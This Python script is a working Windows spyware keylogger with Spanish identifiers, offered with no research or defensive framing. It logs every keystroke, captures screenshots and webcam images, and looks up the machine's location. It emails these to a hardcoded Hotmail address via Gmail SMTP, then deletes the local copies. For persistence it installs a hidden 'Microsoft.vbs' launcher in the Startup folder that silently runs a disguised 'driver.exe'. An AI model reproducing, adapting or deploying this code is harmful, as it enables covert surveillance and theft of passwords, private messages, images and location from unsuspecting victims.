import datetime
from pynput.keyboard import Listener
import time
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import datetime
import getpass, os
import shutil
import socket
from email import encoders
import pyautogui
from os import remove
import threading
from threading import Thread
import cv2
import requests
import json


t0 = int(time.time())
disk = os.environ['SYSTEMDRIVE']
def key_listener():
    d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    necesario = getpass.getuser()

    def key_recorder(key):
        try:
            os.makedirs('{}/Users/{}/Documents/tempfiles'.format(disk,necesario))
        except:
            pass


        file_name = '{}/Users/{}/Documents/tempfiles/temp_{}.txt'.format(disk,necesario,d)

        f = open(file_name, 'a')

        key = str(key)
        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace("Key.backspace", "%BORRAR%"))
        elif key == '<65027>':
            f.write('%ARROBA%')
        else:
            f.write(key.replace("'", ""))

        global t0
        if int(time.time()) - t0 > 20: #14400
            f.close()
            try:
                enviar_email(file_name)
            except:
                pass
            t0=time.time()

    with Listener(on_press=key_recorder) as listener:
        listener.join()


def enviar_email(nombre):

    def cargar_key():
        return open('pass.key', 'rb').read()

    d = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    necesario = getpass.getuser()

    try:
        os.makedirs('{}/Users/{}/Documents/binaries'.format(disk,necesario))
    except:
        pass

    scsh = pyautogui.screenshot()
    scsh.save('{}/Users/{}/Documents/binaries/picture_{}.png'.format(disk,necesario, d))
    foto = '{}/Users/{}/Documents/binaries/picture_{}.png'.format(disk,necesario, d)

    try:
        os.makedirs('{}/Users/{}/Documents/binaries'.format(disk,necesario))
    except:
        pass

    cap = cv2.VideoCapture(0)
    flag = cap.isOpened()
    index = 1
    ret, frame = cap.read()
    cv2.imwrite("{}/Users/{}/Documents/binaries/cap_{}.jpg".format(disk,necesario, d), frame)
    cam = "C:/Users/{}/Documents/binaries/cap_{}.jpg".format(necesario, d)
    cap.release()

    localizt = socket.gethostbyname(socket.gethostname())
    response = requests.get("https://geolocation-db.com/json/{}.79&position=true".format(localizt)).json()
    response2 = json.dumps(response,indent=4,ensure_ascii=True)
    with open("{}/Users/{}/Documents/binaries/dates.txt".format(disk,necesario), 'w+') as dates:
        dates.write(response2)
    ubidate = "{}/Users/{}/Documents/binaries/dates.txt".format(disk, necesario)


    key = cargar_key()

    clave = Fernet(key)
    pass_enc = (open('pass.enc', 'rb').read())
    password = clave.decrypt((pass_enc)).decode()

    usuario = getpass.getuser()
    msg = MIMEMultipart()
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    mensaje = f'Fichero de {usuario}, IP: {IPAddr}'

    msg['From'] = 'anon.imort3@gmail.com'
    msg['To'] = 'sragustin01@hotmail.com'
    msg['Subject'] = 'Personal Files'

    msg.attach(MIMEText(mensaje, 'plain'))


    attachment = open(nombre, 'r')
    attachment2 = open(foto, 'rb')
    attachment3 = open(cam, 'rb')
    attachment4 = open(ubidate, 'r')


    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition',"attachment; filename= %s" % str(nombre))
    msg.attach(p)

    ph = MIMEBase('aplication', 'octet-stream')
    ph.set_payload((attachment2).read())
    encoders.encode_base64(ph)
    ph.add_header('Content-Disposition',f'attachment; filename= {foto}')
    msg.attach(ph)

    phc = MIMEBase('aplication', 'octet-stream')
    phc.set_payload((attachment3).read())
    encoders.encode_base64(phc)
    phc.add_header('Content-Disposition', f'attachment; filename= {cam}')
    msg.attach(phc)

    dt = MIMEBase('application', 'octet-stream')
    dt.set_payload((attachment4).read())
    dt.add_header('Content-Disposition',f"attachment; filename= {ubidate}")
    msg.attach(dt)

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

    def limp():
        time.sleep(5)
        remove(nombre)
        remove(foto)
        remove(cam)
        remove(ubidate)
    limpieza = Thread(target=limp)
    limpieza.start()

def mover_fichero():
    USER_NAME = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open(path_script+'\\'+'process.bat', 'w+') as bat_file:
        bat_file.write('cd "C:/Users/{}/Documents"\n'.format(USER_NAME))
        bat_file.write('"driver.exe"')

    #if (os.path.dirname(os.path.abspath(__file__))) != ('C:\\Users\\{}\\Documents'.format(USER_NAME)):
    try:
        fuente = 'driver.exe'
        fuente2 = '{}\\process.bat'.format(path_script)
        destino = 'C:\\Users\\{}\\Documents'.format(USER_NAME)
        shutil.copy(fuente, destino)
        shutil.copy(fuente2, destino)
    except:# shutil.SameFileError:
        pass

    with open(final_path+'\\'+"Microsoft.vbs", "w+") as vbs_file:
        os.system('attrib +h C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft.vbs'.format(USER_NAME))
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "C:/Users/{}/Documents/process.bat" & Chr(34), 0\n'.format(USER_NAME))
        vbs_file.write('Set WinScriptHost = Nothing\n')
        #vbs_file.IconLocation = 'def.ico,1' cambiar el icono


def comienzo():
    #if __name__ == '__main__':
    mover_fichero()
    key_listener()

comienzo()